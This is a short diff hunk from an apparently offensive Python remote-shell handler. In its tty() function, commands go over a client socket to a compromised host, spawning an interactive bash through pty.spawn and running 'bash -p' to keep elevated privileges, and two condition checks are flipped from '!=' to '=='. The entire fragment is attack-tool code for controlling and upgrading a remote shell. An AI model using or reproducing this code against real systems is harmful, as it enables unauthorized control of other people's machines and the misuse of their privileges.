@@ -216,13 +216,13 @@ def tty():
 		results = client_socket.recv(buffer).decode()
 		if shell in results:
 			break
-	if results != temp_shell:
+	if results == temp_shell:
 		client_socket.send(("python -c 'import pty;pty.spawn(\"/bin/bash\")'"+"\n").encode())
 		while True:
 			results = client_socket.recv(buffer).decode()
 			if shell in results:
 				break
-	if results != temp_shell:
+	if results == temp_shell:
 		client_socket.send(("bash -p"+"\n").encode())
 		while True:
 			results = client_socket.recv(buffer).decode()
